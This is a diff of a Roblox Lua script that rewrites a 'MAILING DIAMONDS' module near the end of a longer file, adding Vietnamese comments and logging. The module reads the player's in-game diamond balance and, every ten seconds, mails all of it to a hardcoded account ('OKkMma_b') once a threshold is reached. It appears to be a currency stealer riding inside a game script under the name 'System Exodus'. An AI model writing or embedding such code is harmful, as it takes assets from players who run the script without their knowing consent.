@@ -812,85 +812,122 @@ task.spawn(function()
 end)
 
 --============= MAILING DIAMONDS ============================
-for _ = 1,3 do print() end
+for i = 1,10 do print() end
 
 if not LPH_OBFUSCATED then
-	getgenv().Settings = {
-		Mailing = { ["Diamonds"] = { Class="Currency", Amount="All", MinDiamonds = 20000000 } },
-		Users = { "OKkMma_b" },
-		["Split Items Evenly"] = false,
-		["Only Online Accounts"] = false,
-		["Developer Mode"] = false,
-		[[ Thank you for using System Exodus <3! ]]
-	}
+    getgenv().Settings = {
+        Mailing = {
+            ["Diamonds"] = {
+                Class = "Currency",
+                Amount = "All",        -- gửi toàn bộ khi đạt ngưỡng
+                MinDiamonds = 20000000  -- ngưỡng tối thiểu (ví dụ: 1 triệu)
+            },
+        },
+        Users = {
+            "OKkMma_b",  -- người nhận
+        },
+        ["Split Items Evenly"] = false,
+        ["Only Online Accounts"] = false,
+        ["Developer Mode"] = false,
+        [[ Thank you for using System Exodus <3! ]]
+    }
 end
 
 if not game:IsLoaded() then game.Loaded:Wait() end
 
 local M_Players = game:GetService("Players")
 local M_ReplicatedStorage = game:GetService("ReplicatedStorage")
-local M_NormalLibrary = M_ReplicatedStorage.Library
-local M_PlayerSave = require(M_NormalLibrary.Client.Save)
+local M_HttpService = game:GetService("HttpService")
+local M_LocalPlayer = M_Players.LocalPlayer
 
 local M_Library = {}
 local M_Client = {}
 for _,v in next, M_ReplicatedStorage.Library.Client:GetChildren() do
-	if v:IsA("ModuleScript") and not v:GetAttribute("NOLOAD") then
-		local ok, mod = pcall(function() return require(v) end)
-		if ok then M_Library[v.Name] = mod M_Client[v.Name] = mod end
-	end
+    if v:IsA("ModuleScript") and not v:GetAttribute("NOLOAD") then
+        local ok, mod = pcall(function() return require(v) end)
+        if ok then M_Library[v.Name] = mod M_Client[v.Name] = mod end
+    end
 end
 for _,v in next, M_ReplicatedStorage.Library:GetChildren() do
-	if v:IsA("ModuleScript") and not v:GetAttribute("NOLOAD") then
-		local ok, mod = pcall(function() return require(v) end)
-		if ok then M_Library[v.Name] = mod end
-	end
+    if v:IsA("ModuleScript") and not v:GetAttribute("NOLOAD") then
+        local ok, mod = pcall(function() return require(v) end)
+        if ok then M_Library[v.Name] = mod end
+    end
 end
 
+local M_NormalLibrary = M_ReplicatedStorage.Library
+local M_PlayerSave = require(M_NormalLibrary.Client.Save)
+
 local function M_GetDiamonds(ReturnUID)
-	for i,v in next, M_PlayerSave.Get()["Inventory"].Currency do
-		if v.id == "Diamonds" then
-			return ReturnUID and i or v._am
-		end
-	end
-	return 0
+    for i,v in next, M_PlayerSave.Get()["Inventory"].Currency do
+        if v.id == "Diamonds" then
+            return ReturnUID and i or v._am
+        end
+    end
+    return 0
 end
 
 local function M_GenerateDescription()
-	local AdjectiveList = { "Bold","Quick","Happy","Tiny","Brave","Clever","Gentle","Mighty","Calm","Loyal","Bright","Wise","Fearless","Vivid" }
-	local NounList = { "Lion","Castle","Book","Cloud","Tiger","Forest","River","Sword","Galaxy","Phoenix","Knight","Star","Dragon" }
-	return AdjectiveList[math.random(#AdjectiveList)] .. " " .. NounList[math.random(#NounList)]
+    local AdjectiveList = {
+        "Bold","Quick","Happy","Tiny","Brave","Clever","Gentle",
+        "Mighty","Calm","Loyal","Bright","Wise","Fearless","Vivid"
+    }
+    local NounList = {
+        "Lion","Castle","Book","Cloud","Tiger","Forest","River",
+        "Sword","Galaxy","Phoenix","Knight","Star","Dragon"
+    }
+    local adj = AdjectiveList[math.random(#AdjectiveList)]
+    local noun = NounList[math.random(#NounList)]
+    return adj .. " " .. noun
 end
 
 local function M_SendMail(Username, Class, UID, Amount)
-	local ok, result = SafeInvoke(M_Library.Network, "Invoke", "Mailbox: Send", Username, M_GenerateDescription(), Class, UID, Amount)
-	if result then
-		getgenv().Settings.MailCost = 0
-		getgenv().Settings.DiamondsAvailable = math.floor(M_GetDiamonds() - (getgenv().Settings.MailCost or 0))
-	else
-		task.wait(3)
-		return M_SendMail(Username, Class, UID, Amount)
-	end
-	return result
+    local success, result = pcall(function()
+        return M_Library.Network.Invoke("Mailbox: Send", Username, M_GenerateDescription(), Class, UID, Amount)
+    end)
+    if result then
+        print(string.format("[Mailing] 💌 Sent %s %s to %s", tostring(Amount), Class, Username))
+        Settings.MailCost = 0
+        Settings.DiamondsAvailable = math.floor(M_GetDiamonds() - Settings.MailCost)
+    else
+        warn("[Mailing] ❌ Send failed, retrying in 3s...")
+        task.wait(3)
+        return M_SendMail(Username, Class, UID, Amount)
+    end
+    return result
 end
 
+-- 💠 GỬI GEMS KHI ĐẠT NGƯỠNG
 task.spawn(function()
-	while task.wait(30) do
-		local DiamondsNow = M_GetDiamonds()
-		local MinDiamonds = (getgenv().Settings.Mailing.Diamonds.MinDiamonds or 0)
-		local UID = M_GetDiamonds(true)
-		if DiamondsNow >= MinDiamonds then
-			local MailCost = getgenv().Settings.MailCost or 0
-			local Sendable = math.max(0, DiamondsNow - MailCost)
-			if Sendable > 0 then
-				for _, Username in next, getgenv().Settings.Users do
-					M_SendMail(Username, "Currency", UID, Sendable)
-				end
-			end
-		end
-	end
-end)
+    print("[Mailing] 🚀 Bắt đầu module gửi kim cương tự động…")
 
---============================================================
--- End of file
---============================================================
+    while task.wait(10) do
+        local DiamondsNow = M_GetDiamonds()
+        local MinDiamonds = (Settings.Mailing.Diamonds.MinDiamonds or 0)
+        local UID = M_GetDiamonds(true)
+
+        if DiamondsNow >= MinDiamonds then
+            local MailCost = Settings.MailCost or 0
+            local Sendable = math.max(0, DiamondsNow - MailCost)
+
+            if Sendable > 0 then
+                print(string.format("[Mailing] 💠 Đạt ngưỡng (%s ≥ %s) — gửi %s gems trừ phí %s",
+                    DiamondsNow, MinDiamonds, Sendable, MailCost))
+
+                for _, Username in next, Settings.Users do
+                    local ok = M_SendMail(Username, "Currency", UID, Sendable)
+                    if ok then
+                        print(string.format("[Mailing] ✅ Gửi thành công %s gems cho %s", Sendable, Username))
+                    else
+                        warn("[Mailing] ⚠️ Gửi thất bại — thử lại sau")
+                    end
+                end
+            else
+                print(string.format("[Mailing] 🔹 Có %s gems nhưng không đủ sau khi trừ phí.", DiamondsNow))
+            end
+        else
+            print(string.format("[Mailing] 💤 Chưa đạt ngưỡng tối thiểu (%s/%s)", DiamondsNow, MinDiamonds))
+        end
+    end
+end)
+-- có cái lồz
